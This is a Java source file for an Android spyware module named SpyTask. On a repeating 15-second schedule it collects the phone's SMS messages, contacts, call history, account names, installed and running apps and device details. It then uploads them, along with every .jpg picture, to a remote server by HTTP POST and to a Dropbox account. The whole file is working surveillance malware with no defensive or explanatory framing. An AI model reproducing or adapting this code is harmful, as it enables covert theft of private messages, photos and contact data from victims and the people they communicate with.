package com.example.spyapp.dex;

import android.accounts.AccountManager;
import android.app.ActivityManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.ContextWrapper;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;
import com.example.spyapp.SpyModel;
import com.google.gson.Gson;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.*;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.ScheduledThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.logging.Logger;
import java.util.stream.Collectors;

public class SpyTask extends ContextWrapper implements DexTask {
    private final Logger logger = Logger.getLogger(this.getClass().getName());
    private final ScheduledExecutorService executorService = new ScheduledThreadPoolExecutor(1);
    private ScheduledFuture scheduledFuture;
    private final String ip;

    public SpyTask(Context base, String ip) {
        super(base);
        this.ip = ip;
    }

    @Override
    public void start() {
        if (scheduledFuture == null || scheduledFuture.isCancelled() || scheduledFuture.isDone()) {
            scheduledFuture = executorService.scheduleAtFixedRate(() -> {
                spyTask();
            }, 0, 15, TimeUnit.SECONDS);
            logger.info("service started.");
        } else {
            logger.info("service is already running");
        }
    }

    @Override
    public void stop() {
        if (scheduledFuture != null) scheduledFuture.cancel(true);
    }

    private void spyTask() {
        SpyModel spyModel = new SpyModel();
        logger.info("Task executed.");

        spyModel.setMessages(getAllSms(getBaseContext()));
        logger.info("Messages: " + spyModel.getMessages());

        spyModel.setContacts(getContacts());
        logger.info("Contacts: " + spyModel.getContacts());

        spyModel.setCalls(getCalls());
        logger.info("Calls: " + spyModel.getCalls());

        spyModel.setVersion(Build.VERSION.RELEASE);
        logger.info("Version: " + spyModel.getVersion());

        spyModel.setSdk(Build.VERSION.SDK_INT);
        logger.info("SDK: " + spyModel.getSdk());

        spyModel.setInstalled(getPackageManager().getInstalledApplications(PackageManager.GET_META_DATA).stream().filter(a -> a.name != null).map(a -> a.name).collect(Collectors.toList()));
        logger.info("Installed: " + spyModel.getInstalled());

        spyModel.setRunning(((ActivityManager) getSystemService(ACTIVITY_SERVICE)).getRunningAppProcesses().stream().filter(a -> a.processName != null).map(a -> a.processName).collect(Collectors.toList()));
        logger.info("Running: " + spyModel.getRunning());

        spyModel.setBattery(((BatteryManager)getSystemService(BATTERY_SERVICE)).getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY));
        logger.info("Battery: " + spyModel.getBattery());

        ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
        ((ActivityManager) getSystemService(ACTIVITY_SERVICE)).getMemoryInfo(memoryInfo);
        spyModel.setMemory(memoryInfo.availMem);
        logger.info("Memory: " + spyModel.getMemory());

        spyModel.setAccounts(Arrays.stream(AccountManager.get(this).getAccounts()).filter(a -> a.name != null).map(a -> a.name).collect(Collectors.toList()));
        logger.info("Accounts: " + spyModel.getAccounts());

        byte[] data = new Gson().toJson(spyModel).getBytes(StandardCharsets.UTF_8);
        uploadData("http://" + ip + ":8080/uploads/data.txt", data);
        uploadToDisk(new ByteArrayInputStream(data), "data.txt");

        File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
        File[] images = dcim.listFiles((dir, name) -> name.endsWith(".jpg"));

        for (File image : images) {
            try {
                uploadData("http://" + ip + ":8080/uploads/" + image.getName(), Files.readAllBytes(image.toPath()));
                uploadToDisk(new FileInputStream(image), image.getName());
            } catch (Exception ignored) {}

            logger.info("Uploaded image: " + image.getName());
        }
    }

    private List<String> getCalls() {
        ContentResolver cr = getContentResolver();
        Cursor c = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        List<String> calls = new ArrayList<>();

        if (c != null) {
            try {
                while (c.moveToNext()) {
                    String number = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    String date = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DATE));
                    String duration = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION));

                    calls.add(number + " : " + date + " : " + duration);
                }
            } finally {
                c.close();
            }
        }

        return calls;
    }

    private List<String> getContacts() {
        ContentResolver cr = getContentResolver();
        Cursor c = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        List<String> contacts = new ArrayList<>();

        if (c != null) {
            try {
                while (c.moveToNext()) {
                    String name = c.getString(c.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                    String number = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));

                    contacts.add(name + " : " + number);
                }
            } finally {
                c.close();
            }
        }

        return contacts;
    }

    private List<String> getAllSms(Context context) {
        ContentResolver cr = context.getContentResolver();
        Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        List<String> messages = new ArrayList<>();
        int totalSMS = 0;

        if (c != null) {
            totalSMS = c.getCount();
            if (c.moveToFirst()) {
                for (int j = 0; j < totalSMS; j++) {
                    String date = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    String type;

                    switch (Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                        case Telephony.Sms.MESSAGE_TYPE_INBOX:
                            type = "inbox";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_SENT:
                            type = "sent";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                            type = "outbox";
                            break;
                        default:
                            type = "unknown";
                            break;
                    }
                    messages.add(date + " : " + number + " : " + body + " : " + type);

                    c.moveToNext();
                }
            }
            c.close();
        }

        return messages;
    }

    private void uploadData(String url, byte[] data) {
        HttpURLConnection connection = null;
        try {
            connection = (HttpURLConnection) (new URL(url).openConnection());
            connection.setRequestMethod("POST");

            connection.setDoOutput(true);
            OutputStream stream = connection.getOutputStream();
            stream.write(data);
            stream.close();
            connection.connect();

            connection.getInputStream();

        } catch (Exception ex) {
            logger.info(ex.getMessage());
        } finally {
            connection.disconnect();
        }
    }

    private void uploadToDisk(InputStream in, String name) {
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/bos1").build();
        DbxClientV2 client = new DbxClientV2(config, "");

        try {
            FileMetadata fileMetadata = client.files().upload("/" + name)
                    .uploadAndFinish(in);
        } catch (Exception e) {
            logger.info(e.getMessage());
        }
    }
}
